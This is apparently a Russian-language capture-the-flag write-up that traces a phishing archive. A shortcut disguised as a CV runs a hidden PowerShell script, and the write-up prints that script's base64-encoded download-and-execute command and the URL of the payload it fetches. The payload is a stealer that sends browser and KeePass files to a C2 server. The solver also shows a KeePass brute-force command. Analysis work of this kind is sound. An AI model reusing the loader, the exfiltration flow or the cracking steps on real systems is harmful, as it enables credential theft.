## How Much Is The Phish
На почту нашей службе безопасности пришло письмо от HR, внутри которого был вот такой архив.
Пользователь сказал, что резюме открылось не совсем обычно, а с некой задержкой.
Посмотри, с чем это может быть связано...

---
На старте нам дан архив CV.zip
Распакуем его и видим странный файл:

![image](https://github.com/user-attachments/assets/c55aac40-b6c6-4468-a7b5-99bd3928882d)

Видим, что на самом деле это не .docx файл, а ярлык.

Проанализируем содержимое этого ярлыка:

![image](https://github.com/user-attachments/assets/f42b18d4-b12d-45da-823a-5fd3711e1d3c)

Ярлык запускает файл updater.ps1, но мы этот файл не видим в директории. Почему? Он скрыт.

Включаем видимость скрытых файлов, теперь наша директория выглядит так:

![image](https://github.com/user-attachments/assets/5dd820ee-f452-41f3-be6e-f603678d8ff9)

Изучим содержимое скрипта updater.ps1:

![image](https://github.com/user-attachments/assets/58162444-dfdf-4f74-8e8b-aae39516e58f)

Скрип содержит закодированную команду:
```
$EncodedText = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AZwBpAHMAdAAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBoAGUAcgBlAHAAYQB3AHcAawBhAC8AZAA2ADMAMgAzADcAOQBmADEAMQAwAGQAOQA0AGMAMAAwADkAMgA3ADAAYwBmAGUAYwA2AGIANQBlADIANgBjAC8AcgBhAHcALwBhAGIAOAAzAGMAYwA4ADgANAA5ADMAZQAwADcAYwA0ADEAZgA1ADAAYwA1AGYAYQBiADAANgBkAGUAOQBhAGQAMgA3AGQAMgAzADAAYQA2AC8AYwBoAGUAYwBrAF8AdQBwAGQAYQB0AGUALgBwAHMAMQAnACkA"
```
Эта команда декодируется и исполняется при помощи Invoke-Expression (IEX).
Раскодируем её:

![image](https://github.com/user-attachments/assets/648fd308-9ed9-4f64-ae1f-f5f5dc727b9a)

Получаем ссылку, с которой скачивается полезная нагрузка, и затем исполняется:
https://gist.githubusercontent.com/cherepawwka/d632379f110d94c009270cfec6b5e26c/raw/ab83cc88493e07c41f50c5fab06de9ad27d230a6/check_update.ps1

Анализируем скрипт:

![image](https://github.com/user-attachments/assets/b9b6b9b6-465f-46e3-8dc8-6f1423d29bd7)

В первой части скрипта осуществляется сборка домена, давайте же узнаем доменное имя C2-домена:

![image](https://github.com/user-attachments/assets/90feb6ed-421a-451b-8125-7da24c18473b)

Получаем следующее:
```
PS C:\Windows\system32> echo $domain
microsoft-update.org
PS C:\Windows\system32> echo $prefix
check-connection.
PS C:\Windows\system32> echo $url
http://check-connection.microsoft-update.org:31337
```
Ответом на первое задание будет флаг (формат: `flag{http://domain:port}`):
```
flag{http://check-connection.microsoft-update.org:31337}
```

Проанализировав остальное содержимое скрипта, понимаем, что он предназначен для кражи пользовательских данных: файлов браузера и файлов .kdbx (хранилища KeePass).
Указанные файлы отправляются на C2-сервер. Давайте перехватим трафик и поёмем, что происходит под капотом.
Из скрипта мы знаем, что IP-адрес C2-сервера: 51.250.113.206.
Настроим захват пакетов на этот сервер:

![image](https://github.com/user-attachments/assets/d4364b61-e1f0-4710-83f0-a2618990b375)

И запустим захват трафика.
В изолированной среде осуществляем запуск скрипта (важно, запуск должен осуществляться от имени администратора):

После чего начинаем анализировать содержимое трафика.
В трафике находим интересный запрос, который, как видно из скрипта, осуществляет проверку доступности C2-сервера:

![image](https://github.com/user-attachments/assets/91557179-aedd-4dd0-b67f-a32013275425)

Здесь же получаем первую часть флага:
```
flag{1_w4n7_y0u_b4ck
```

Теперь проверим, что было далее. Видим, что на эндпоинт http://check-connection.microsoft-update.org:31337/collection осуществляется отправка содержимого в Base64:

![image](https://github.com/user-attachments/assets/5726f2b9-01a5-42e5-bca5-c8d9923e4b33)

*Для тестирования я создал тестовый текстовый файл test.kdbx, чтобы скрипт стиллера отработал корректно.*
В результате успешной отправки нашего псевдофайла .kdbx сервер отдал нам следующий ответ, попутно раскрыв одну из директорий:
![image](https://github.com/user-attachments/assets/7a4a0ca4-b6b0-4614-a35d-917ed4c0d8fd)

Перейдем на этот URL:
http://51.250.113.206:31337/archives_513426d0-854a-44db-9abc-b8c24c70786b

![image](https://github.com/user-attachments/assets/9b18053e-3b84-4974-8481-c46e676661a6)

Видим несколько архивов и инфомрационный файл.
Один архив загружен нами, а один, с индексом 0, скорее всего был украден в ходе компрометации жертвы.
Скачаем его по пути http://51.250.113.206:31337/archives_513426d0-854a-44db-9abc-b8c24c70786b/archive_0.zip:

![image](https://github.com/user-attachments/assets/a26a10ae-477f-4d0c-991d-c7e3a8708719)

Внутри находится файл с расширением .kdbx:

![image](https://github.com/user-attachments/assets/4e7a0856-205d-4533-9e85-f5f492bf5440)

Он запаролен, и нам нужно его взломать.
Для этого скачаем его вновь, только в этот раз на Kali:

![image](https://github.com/user-attachments/assets/8b66b53e-c4bd-4b89-93d8-026c3e4098f8)

Для брута будем использовать этот скрипт:
https://github.com/r3nt0n/keepass4brute
Запускаем его:
```
/opt/keepass4brute/keepass4brute.sh Database_Victim.kdbx /usr/share/wordlists/rockyou.txt
```

![image](https://github.com/user-attachments/assets/cc46cb9d-7c39-4c26-9b36-3ad534922e95)

Подбираем пароль: `scooter`
Идём и забираем флаг:

![image](https://github.com/user-attachments/assets/7b85482a-8e16-4468-a616-5cbc58f1c01a)

Полный флаг:
```
flag{1_w4n7_y0u_b4ck_f0r_7h3_ph151ng_4774ck}
```
